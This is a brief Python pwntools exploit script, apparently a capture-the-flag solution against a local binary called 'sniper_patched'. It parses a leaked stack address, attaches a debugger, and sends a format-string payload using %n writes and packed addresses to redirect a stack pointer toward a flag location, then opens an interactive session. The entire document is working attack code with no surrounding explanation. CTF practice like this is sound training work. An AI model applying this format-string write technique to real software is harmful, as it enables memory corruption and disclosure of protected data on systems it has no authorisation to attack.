from pwn import *


binary = './sniper_patched'
libc = ELF('./libc.so.6')
p = process(binary)
s = '''
b * printf
b * vuln+103
'''

gdb.attach(p, s)


rdi = p.recvline().strip().decode()
rdi = int(rdi, 16)

print(hex(rdi))
flag_addr = 0xa0a0000

flag_stack_pos = rdi + 24
 # Value without \xa0
payload = b"%168427520c%10$n%9$p----" # this %p prints 0x9f9f000, which is before the modification. 
payload += p64(0x9f9f000) 
payload += p64(flag_stack_pos)



p.sendline(payload)

p.interactive()
